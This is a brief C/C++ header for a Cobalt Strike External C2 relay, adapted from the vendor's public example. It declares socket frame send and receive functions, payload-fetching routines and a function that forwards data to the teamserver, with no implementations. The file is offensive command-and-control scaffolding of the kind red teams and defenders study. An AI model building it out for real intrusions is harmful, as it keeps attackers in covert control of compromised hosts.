#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
//pulled from https://github.com/Cobalt-Strike/External-C2/blob/main/extc2example.c#L84

/* receive a frame from a socket */
//std::vector<uint8_t> recv_frame(SOCKET my_socket);
//DWORD recv_frame(SOCKET my_socket, char* buffer, DWORD max);
std::vector<uint8_t> recv_frame(SOCKET my_socket);
/* send a frame via a socket */
void send_frame(SOCKET my_socket, char* buffer, int length);

std::vector<uint8_t> getx64Payload();
std::vector<uint8_t> getx86Payload();

std::vector<uint8_t> forwardToTeamserver(std::vector<uint8_t> dataForTeamserver);